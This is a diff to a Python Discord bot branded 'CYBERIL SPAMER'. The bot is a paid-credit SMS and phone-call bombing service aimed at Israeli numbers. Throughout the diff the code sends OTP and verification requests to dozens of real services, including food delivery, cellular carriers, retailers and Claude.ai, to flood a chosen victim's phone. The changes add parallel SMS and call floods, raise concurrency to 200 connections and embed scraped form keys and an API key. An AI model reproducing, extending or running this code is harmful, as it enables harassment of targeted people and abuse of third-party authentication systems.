@@ -1,6 +1,6 @@
 import discord
 from discord import app_commands
-from discord.ext import commands, tasks
+from discord.ext import commands
 import asyncio
 import time
 import random
@@ -14,7 +14,7 @@ import os
 from datetime import datetime, timezone, timedelta
 import certifi
 import socket
-import json
+import concurrent.futures
 from collections import defaultdict
 
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -59,6 +59,7 @@ active_missions = {}
 cooldown_tracker = {}
 is_shutting_down = False
 stats_counter = defaultdict(int)
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -241,7 +242,7 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
         return False, tag
 
 async def atmos_request(session, store_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/", is_call=False):
-    tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
+    tag = f"atmos-call-{store_id}" if is_call else f"atmos-sms-{store_id}"
     fd = aiohttp.FormData()
     fd.add_field("restaurant_id", store_id)
     fd.add_field("phone", phone)
@@ -263,140 +264,9 @@ async def atmos_request(session, store_id, phone, origin="https://order.atmos.re
         async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+            return ok, tag
     except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def process_atmos_batch(session, target, stores, is_call=False):
-    tasks = [atmos_request(session, sid, target, is_call=is_call) for sid in stores]
-    return await asyncio.gather(*tasks, return_exceptions=True)
-
-async def claude_request(session, phone):
-    tag = "claude"
-    clean = phone.lstrip('0')
-    if not clean.startswith('+972'):
-        clean = f"+972{clean}"
-    url = "https://claude.ai/api/auth/send_phone_code"
-    h = {
-        "accept": "*/*",
-        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
-        "content-type": "application/json",
-        "origin": "https://claude.ai",
-        "referer": "https://claude.ai/onboarding",
-        "user-agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with session.post(url, json={"phone_number": clean}, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def oshioshi_request(session, phone):
-    tag = "oshioshi"
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
-            text = await resp.text()
-            match = re.search(r'name="_token"\s+value="([^"]+)"', text)
-            if not match:
-                return False, tag, "Missing Token"
-            token = match.group(1)
-        url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
-        form_data = f"phone={phone}&_token={token}"
-        h = {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "origin": "https://delivery.oshioshi.co.il",
-            "referer": "https://delivery.oshioshi.co.il/he/",
-            "User-Agent": random_agent()
-        }
-        async with session.post(url, data=form_data, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def freetv_request(session, phone):
-    tag = "freetv"
-    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
-    url = "https://middleware.freetv.tv/api/v1/send-verification-sms"
-    payload = {"msisdn": formatted}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "User-Agent": random_agent(),
-        "Origin": "https://freetv.tv",
-        "Referer": "https://freetv.tv/"
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def webcut_request(session, phone):
-    tag = "webcut"
-    url = "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp"
-    payload = {"type": "otp", "data": {"phone": phone}}
-    h = {
-        "Content-Type": "application/json",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def freeivr_request(session, phone):
-    tag = "freeivr"
-    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
-    url = "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone"
-    payload = {"action": "Send", "phone": formatted}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://f2.freeivr.co.il",
-        "Referer": "https://f2.freeivr.co.il/register",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def mitmachim_request(session, phone):
-    tag = "mitmachim"
-    url = "https://mitmachim.top/api/v3/plugins/MitMValidPhone"
-    payload = {"action": "Send", "phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://mitmachim.top",
-        "Referer": "https://mitmachim.top/register",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
+        return False, tag
 
 async def run_spam_batch(phone: str):
     raw = phone
@@ -424,7 +294,7 @@ async def run_spam_batch(phone: str):
             h.update(extra)
         return h
 
-    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
         atmos_stores = [
             "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
@@ -433,37 +303,54 @@ async def run_spam_batch(phone: str):
             "2063","2070","2073","2076","2078","2087","2088","2091",
         ]
         
-        atmos_sms = await process_atmos_batch(s, raw, atmos_stores, is_call=False)
-        atmos_call = await process_atmos_batch(s, raw, atmos_stores, is_call=True)
+        # כל המשימות - SMS + CALL במקביל
+        tasks = []
         
-        atmos_club = [
-            atmos_request(s, "23", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False),
-            atmos_request(s, "59", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False),
-        ]
-
+        # אטומס - 38 SMS + 38 CALL
+        for store in atmos_stores:
+            tasks.append(atmos_request(s, store, raw, is_call=False))
+            tasks.append(atmos_request(s, store, raw, is_call=True))
+        
+        # אטומס קלאב
+        tasks.append(atmos_request(s, "23", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False))
+        tasks.append(atmos_request(s, "59", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False))
+        
         geteat_fd = aiohttp.FormData()
         geteat_fd.add_field("restaurant_id", "9")
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        tasks = [
+        # ========== כל השירותים ==========
+        tasks.extend([
             # Netfree
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": formatted},
                 headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                 tag="netfree"),
+            
             # Claude
-            claude_request(s, raw),
+            send_request(s, "https://claude.ai/api/auth/send_phone_code",
+                json_data={"phone_number": formatted}, tag="claude"),
+            
             # Oshioshi
-            oshioshi_request(s, raw),
+            send_request(s, "https://delivery.oshioshi.co.il/he/auth/register-send-code",
+                form=f"phone={raw}", tag="oshioshi"),
+            
             # FreeTV
-            freetv_request(s, raw),
+            send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms",
+                json_data={"msisdn": formatted}, tag="freetv"),
+            
             # Webcut
-            webcut_request(s, raw),
+            send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
+                json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
+            
             # FreeIVR
-            freeivr_request(s, raw),
+            send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
+                json_data={"action": "Send", "phone": f"972{raw[1:]}"}, tag="freeivr"),
+            
             # Mitmachim
-            mitmachim_request(s, raw),
+            send_request(s, "https://mitmachim.top/api/v3/plugins/MitMValidPhone",
+                json_data={"action": "Send", "phone": raw}, tag="mitmachim"),
             
             # ========== CELLULAR COMPANIES ==========
             send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
@@ -529,21 +416,13 @@ async def run_spam_batch(phone: str):
             
             # ========== RETAIL & FASHION ==========
             send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
-                form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="negev-group"),
+                form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}", tag="negev"),
             send_request(s, "https://www.gali.co.il/customer/ajax/post/",
-                form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.gali.co.il", "https://www.gali.co.il/"),
-                tag="gali"),
+                form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}", tag="gali"),
             send_request(s, "https://www.aldoshoes.co.il/customer/ajax/post/",
-                form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
-                tag="aldoshoes"),
+                form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}", tag="aldo"),
             send_request(s, "https://www.hoodies.co.il/customer/ajax/post/",
-                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
-                tag="hoodies"),
+                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}", tag="hoodies"),
             send_request(s, "https://www.delta.co.il/customer/ajax/post/",
                 form=f"form_key=abc123&bot_validation=1&type=login&telephone={raw}", tag="delta"),
             send_request(s, "https://www.adikastyle.com/customer/ajax/post/",
@@ -621,7 +500,7 @@ async def run_spam_batch(phone: str):
             send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                 form=f"action=validate_user_by_sms&phone={raw}", tag="moraz"),
             send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
-                form=f"action=validate_user_by_sms&phone={raw}", tag="spicesonline"),
+                form=f"action=validate_user_by_sms&phone={raw}", tag="spices"),
             send_request(s, "https://www.stepin.co.il/customer/ajax/post/",
                 form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}", tag="stepin"),
             send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
@@ -636,13 +515,13 @@ async def run_spam_batch(phone: str):
             send_request(s, "POST", "https://rest-api.dibs-app.com/otps",
                 json_data={"phoneNumber": formatted}, tag="dibs"),
             
-            # ========== MISHLOHA (MULTIPLE ENDPOINTS) ==========
+            # ========== MISHLOHA (3 ENDPOINTS) ==========
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                 json_data={"phoneNumber": raw, "isCalling": True}, tag="mishloha1"),
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                 json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True}, tag="mishloha2"),
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?culture=he&apiVersion=2",
-                json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": "c049beda-2a99-442c-afa9-db86ea140940", "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": sid[:36]}, tag="mishloha3"),
+                json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": sid[:36], "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": sid[:36]}, tag="mishloha3"),
             
             # ========== FORMS & OTHER ==========
             send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
@@ -678,13 +557,13 @@ async def run_spam_batch(phone: str):
             send_request(s, "https://www.zinger-organic.com/frontend/chkkksoepvnbnbb",
                 form=f"phone_number={raw}&_token=UvDFsX8fy3p35K3mVrXRCBJzrgjHWvYZAyMrnNnT&login_message_type=sms", tag="zinger"),
             send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungleclub"),
+                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungle"),
             send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php",
                 form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
             send_request(s, "https://api.gomobile.co.il/api/login",
                 json_data={"phone": raw}, tag="gomobile"),
             send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
-                json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonitademas"),
+                json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonita"),
             send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
                 json_data={"phone": raw}, tag="story"),
             send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
@@ -699,8 +578,9 @@ async def run_spam_batch(phone: str):
                 data=geteat_fd, tag="geteat"),
             send_request(s, "https://www.ivory.co.il/user/login/sendCodeSms",
                 method="GET", tag="ivory"),
-        ] + atmos_club
+        ])
 
+        # הרצת כל המשימות במקביל
         all_res = await asyncio.gather(*tasks, return_exceptions=True)
         success = 0
         
@@ -708,79 +588,48 @@ async def run_spam_batch(phone: str):
             if isinstance(r, Exception):
                 continue
             elif isinstance(r, tuple):
-                if len(r) == 3:
-                    ok, name, reason = r
-                    if ok:
-                        success += 1
-                else:
-                    ok, name = r
-                    if ok:
-                        success += 1
-
-        for r in atmos_sms:
-            if isinstance(r, Exception):
-                continue
-            elif isinstance(r, tuple):
-                if len(r) == 3:
-                    ok, name, reason = r
-                    if ok:
-                        success += 1
-                else:
-                    ok, name = r
-                    if ok:
-                        success += 1
-                        
-        for r in atmos_call:
-            if isinstance(r, Exception):
-                continue
-            elif isinstance(r, tuple):
-                if len(r) == 3:
-                    ok, name, reason = r
-                    if ok:
-                        success += 1
-                else:
-                    ok, name = r
-                    if ok:
-                        success += 1
+                ok, name = r
+                if ok:
+                    success += 1
 
         return success
 
 def create_panel():
     embed = discord.Embed(
-        title="**CYBERIL SPAMER**",
-        description="המערכת המתקדמת בישראל | 100+ שירותים | ללא הגבלה",
+        title="🔥 **CYBERIL SPAMER** 🔥",
+        description="**המערכת החזקה ביותר בישראל**\n> 100+ שירותים | SMS + CALL | מהירות אור",
         color=COLOR_MAIN
     )
     embed.add_field(
-        name="🚀 התחל ספאם",
-        value="לחץ על הכפתור התחל ספאם\nהזן מספר טלפון ובחר כמות קרדיטים",
+        name="🚀 **התחל ספאם**",
+        value="```\n1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן לתוצאות```",
         inline=False
     )
     embed.add_field(
-        name="💎 עלות",
-        value=f"כל קרדיט = דקה אחת\nכל דקה = 100+ בקשות",
+        name="💎 **עלות**",
+        value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 150+ בקשות\nשיחות + SMS במקביל```",
         inline=False
     )
     embed.add_field(
-        name="⚡ מהירות",
-        value=f"שליחה במהירות הרשת המקסימלית\nדיליי של {COOLDOWN_TIME} שניות בין ספאם",
+        name="⚡ **מהירות**",
+        value=f"```\nשליחה במהירות הרשת המקסימלית\nדיליי של {COOLDOWN_TIME} שניות בין ספאם\n200+ חיבורים במקביל```",
         inline=False
     )
-    embed.set_footer(text=f"CyberIL Spamer © 2026")
+    embed.set_footer(text=f"🔥 CYBERIL SPAMER | הכי חזק בארץ 🔥")
     return embed
 
 def create_gift_panel():
     embed = discord.Embed(
-        title="**קרדיטים חינם**",
-        description="קבל קרדיט אחד כל 24 שעות",
+        title="🎁 **קרדיטים חינם** 🎁",
+        description="```\nקבל קרדיט אחד כל 24 שעות\nללא הגבלה על כמות הקרדיטים\nהקרדיטים נצברים לאורך זמן```",
         color=0xFFD700
     )
     embed.add_field(
-        name="🎁 איך מקבלים?",
-        value="לחץ על הכפתור למטה",
+        name="🎯 **איך מקבלים?**",
+        value="```\nלחץ על הכפתור למטה וקבל קרדיט מיידית!```",
         inline=False
     )
-    embed.set_footer(text="CyberIL Spamer © 2026")
+    embed.set_footer(text="🔥 CYBERIL SPAMER 🔥")
     return embed
 
 class StopAttack(discord.ui.View):
@@ -788,7 +637,7 @@ class StopAttack(discord.ui.View):
         super().__init__(timeout=None)
         self.user_id = user_id
 
-    @discord.ui.button(label="עצור ספאם", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_attack")
+    @discord.ui.button(label="⏹️ עצור ספאם", style=discord.ButtonStyle.danger, emoji="⏹️", custom_id="stop_attack")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id and not is_admin(interaction):
             await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
@@ -807,7 +656,7 @@ class ConfirmAttack(discord.ui.View):
         self.user_id = user_id
         self.is_running = False
 
-    @discord.ui.button(label="✅ כן, התחל ספאם", style=discord.ButtonStyle.danger, emoji="✅", custom_id="confirm_attack")
+    @discord.ui.button(label="✅ התחל ספאם", style=discord.ButtonStyle.danger, emoji="✅", custom_id="confirm_attack")
     async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
             await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
@@ -831,7 +680,7 @@ class ConfirmAttack(discord.ui.View):
         stop_event = asyncio.Event()
         active_missions[self.user_id] = stop_event
 
-        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"מספמם את **{self.phone}**\nזמן: ~{self.cost} דקות", color=COLOR_WARNING)
+        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**{self.phone}** | **{self.cost} דקות**\nSMS + CALL במקביל", color=COLOR_WARNING)
         await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
 
         total_success = 0
@@ -848,12 +697,12 @@ class ConfirmAttack(discord.ui.View):
                 success = await run_spam_batch(self.phone)
                 total_success += success
                 
-                if time.time() - last_update >= 3:
+                if time.time() - last_update >= 2:
                     remaining = max(0, int((end_time - time.time()) / 60))
                     rate = int(total_success / max(1, time.time() - start_time))
                     embed = discord.Embed(
                         title="🔄 ספאם בתהליך",
-                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ בקשות: {total_success}\n⚡ קצב: {rate}/שנייה",
+                        description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n📞 שיחות + SMS במקביל",
                         color=COLOR_WARNING
                     )
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
@@ -877,18 +726,19 @@ class ConfirmAttack(discord.ui.View):
             )
 
             bal = await format_balance(self.user_id)
+            rate = int(total_success / max(1, self.cost * 60))
             
             if stopped:
                 final = discord.Embed(title="⏹️ ספאם הופסק", color=COLOR_WARNING)
             else:
                 final = discord.Embed(title="✅ ספאם הושלם", color=COLOR_SUCCESS)
             
-            rate = int(total_success / max(1, self.cost * 60))
             final.add_field(name="📱 יעד", value=self.phone, inline=True)
-            final.add_field(name="⏱️ משך", value=f"~{self.cost} דקות", inline=True)
+            final.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
             final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
             final.add_field(name="⚡ קצב", value=f"{rate}/שנייה", inline=True)
-            final.add_field(name="💎 קרדיטים נותרים", value=bal, inline=True)
+            final.add_field(name="💎 קרדיטים", value=bal, inline=True)
+            final.add_field(name="📞 סוג", value="SMS + CALL", inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
 
@@ -907,8 +757,8 @@ class ConfirmAttack(discord.ui.View):
         await interaction.response.edit_message(embed=embed, view=None)
 
 class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
-    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=9, max_length=10, style=discord.TextStyle.short)
-    credits = discord.ui.TextInput(label="כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)
+    phone = discord.ui.TextInput(label="📱 מספר טלפון", placeholder="0501234567", min_length=9, max_length=10, style=discord.TextStyle.short)
+    credits = discord.ui.TextInput(label="💎 כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)
 
     async def on_submit(self, interaction: discord.Interaction):
         phone_num = self.phone.value.strip().replace("-", "").replace(" ", "")
@@ -929,7 +779,6 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
             return
 
         uid = interaction.user.id
-
         bal = await fetch_balance(uid)
         unlimited = await has_unlimited(uid)
 
@@ -948,7 +797,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
         
         confirm = discord.Embed(
             title="⚠️ אישור ספאם",
-            description=f"יעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}",
+            description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n📞 SMS + CALL במקביל",
             color=COLOR_WARNING
         )
         
@@ -979,10 +828,10 @@ class MainPanel(discord.ui.View):
         bal_str = await format_balance(uid)
         stats = await get_user_stats(uid)
 
-        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"יתרה: **{bal_str}**", color=COLOR_INFO)
+        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"**{bal_str}**", color=COLOR_INFO)
         
         if stats:
-            embed.add_field(name="📊 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+            embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
             embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
 
         await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1001,9 +850,9 @@ class MainPanel(discord.ui.View):
             return
 
         embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
-        embed.add_field(name="🎯 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+        embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
         embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
-        embed.add_field(name="💎 קרדיטים בשימוש", value=str(stats.get("total_cost", 0)), inline=True)
+        embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
         embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
         
         await interaction.followup.send(embed=embed, ephemeral=True)
@@ -1123,7 +972,7 @@ async def on_ready():
     client.add_view(MainPanel())
     client.add_view(FreeCoins())
     
-    await client.change_presence(activity=discord.Game(name="🔥 CYBERIL SPAMER | 100+ SERVICES"))
+    await client.change_presence(activity=discord.Game(name="🔥 150+ בקשות/שנייה | SMS+CALL 🔥"))
     print(f"✅ CyberIL Spamer פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
 
@@ -1385,7 +1234,8 @@ async def cmd_checkstatus(interaction: discord.Interaction):
     success = await run_spam_batch(test_num)
 
     embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
-    embed.add_field(name="✅ בקשות שנשלחו", value=str(success), inline=True)
+    embed.add_field(name="✅ בקשות", value=str(success), inline=True)
+    embed.add_field(name="📞 סוג", value="SMS + CALL", inline=True)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
